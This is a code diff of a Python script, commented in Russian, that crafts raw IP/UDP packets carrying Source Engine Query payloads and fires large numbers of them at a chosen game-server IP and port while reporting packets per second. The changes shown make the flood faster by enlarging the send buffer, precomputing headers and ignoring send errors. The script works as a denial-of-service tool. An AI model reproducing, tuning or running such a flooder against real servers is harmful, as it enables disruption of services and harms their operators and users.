@@ -19,11 +19,16 @@ def parse_args():
     return parser.parse_args()
 
 QUERY_PACKET = b'\xff\xff\xff\xff\x54Source Engine Query\x00'
-UDP_LENGTH = 8 + len(QUERY_PACKET)  # Длина UDP заголовка + Payload
+UDP_LENGTH = 8 + len(QUERY_PACKET)  # 8 байт UDP заголовка + Payload
 
+# Создаём RAW-сокет и увеличиваем его буфер
 sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
-sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**20)
+sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**22)  # 4 МБ
 sock.setblocking(False)
+
+# Предкомпилированные структуры для заголовков
+ip_struct = struct.Struct("!BBHHHBBH4s4s")
+udp_struct = struct.Struct("!HHHH")
 
 def checksum(data):
     if len(data) % 2:
@@ -33,53 +38,68 @@ def checksum(data):
     s += (s >> 16)
     return ~s & 0xffff
 
-def create_packet(target_ip, target_port):
-    src_ip = socket.inet_aton("85.234.100.61")  # Реальный исходящий IP
-    dst_ip = socket.inet_aton(target_ip)
+def get_source_ip():
+    # Получаем исходный IP через соединение с удалённым сервером
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except Exception as e:
+        print(f"Ошибка при получении исходного IP: {e}")
+        exit(1)
+
+def create_packet(src_ip_bin, dst_ip_bin, pseudo_header, target_port):
     total_length = 20 + UDP_LENGTH
     ip_id = random.randint(0, 65535)
-    ip_header = struct.pack("!BBHHHBBH4s4s",
-                            0x45, 0, total_length, ip_id, 0x4000,
-                            64, socket.IPPROTO_UDP, 0, src_ip, dst_ip)
+    # Формируем IP заголовок с контрольной суммой = 0
+    ip_header = ip_struct.pack(
+        0x45, 0, total_length, ip_id, 0x4000,
+        64, socket.IPPROTO_UDP, 0, src_ip_bin, dst_ip_bin
+    )
     ip_chksum = checksum(ip_header)
+    # Вставляем рассчитанную контрольную сумму
     ip_header = ip_header[:10] + struct.pack("!H", ip_chksum) + ip_header[12:]
+    
     udp_src_port = random.randint(1024, 65535)
-    udp_header = struct.pack("!HHHH", udp_src_port, target_port, UDP_LENGTH, 0)
-    pseudo_header = src_ip + dst_ip + struct.pack("!BBH", 0, socket.IPPROTO_UDP, UDP_LENGTH)
+    udp_header = udp_struct.pack(udp_src_port, target_port, UDP_LENGTH, 0)
     udp_checksum_data = pseudo_header + udp_header + QUERY_PACKET
     udp_chksum = checksum(udp_checksum_data)
-    udp_header = struct.pack("!HHHH", udp_src_port, target_port, UDP_LENGTH, udp_chksum)
+    udp_header = udp_struct.pack(udp_src_port, target_port, UDP_LENGTH, udp_chksum)
+    
     return ip_header + udp_header + QUERY_PACKET
 
 def send_packets(target_ip, target_port, packet_count, log_every, debug_packets):
     start_time = time.time()
-    sent, error_count = 0, 0
+    sent = 0
     debug_dump = []
     
+    # Вычисляем константные значения один раз
+    local_ip = get_source_ip()
+    src_ip_bin = socket.inet_aton(local_ip)
+    dst_ip_bin = socket.inet_aton(target_ip)
+    pseudo_header = src_ip_bin + dst_ip_bin + struct.pack("!BBH", 0, socket.IPPROTO_UDP, UDP_LENGTH)
+    
     for i in range(packet_count):
-        packet = create_packet(target_ip, target_port)
-        while True:
-            try:
-                sock.sendto(packet, (target_ip, 0))
-                sent += 1
-                if sent % log_every == 0:
-                    elapsed = time.time() - start_time
-                    pps = sent / elapsed if elapsed > 0 else 0
-                    print(f"[INFO] {time.strftime('%H:%M:%S')} - Отправлено {sent} пакетов, {pps:.2f} PPS.")
-                if len(debug_dump) < debug_packets:
-                    debug_dump.append(packet)
-                break
-            except OSError as e:
-                error_count += 1
-                if e.errno == errno.ENOBUFS:
-                    print("[WARNING] ENOBUFS: буфер переполнен. Ожидание...")
-                    time.sleep(0.001)
-                else:
-                    print(f"[ERROR] Ошибка отправки пакета: {e} (errno {e.errno})")
-                    break
+        packet = create_packet(src_ip_bin, dst_ip_bin, pseudo_header, target_port)
+        try:
+            sock.sendto(packet, (target_ip, 0))
+            sent += 1
+            if sent <= debug_packets:
+                debug_dump.append(packet)
+        except OSError as e:
+            if e.errno == errno.ENOBUFS:
+                time.sleep(0.001)
+            # Для остальных ошибок ничего не делаем для повышения производительности
+
+        if (i+1) % log_every == 0:
+            elapsed = time.time() - start_time
+            pps = (i+1) / elapsed if elapsed > 0 else 0
+            print(f"[INFO] {time.strftime('%H:%M:%S')} - Отправлено {i+1} пакетов, {pps:.2f} PPS.")
+    
     elapsed = time.time() - start_time
     print(f"\n[RESULT] Отправлено {sent} пакетов за {elapsed:.2f} сек. ({sent/elapsed:.2f} PPS)")
-    print(f"[ERRORS] Количество ошибок: {error_count}")
     if debug_dump:
         print("\n[DEBUG] Hex-дамп первых пакетов:")
         for idx, pkt in enumerate(debug_dump):
@@ -88,3 +108,4 @@ def send_packets(target_ip, target_port, packet_count, log_every, debug_packets)
 if __name__ == "__main__":
     args = parse_args()
     send_packets(args.target_ip, args.target_port, args.count, args.log_every, args.debug_packets)
+
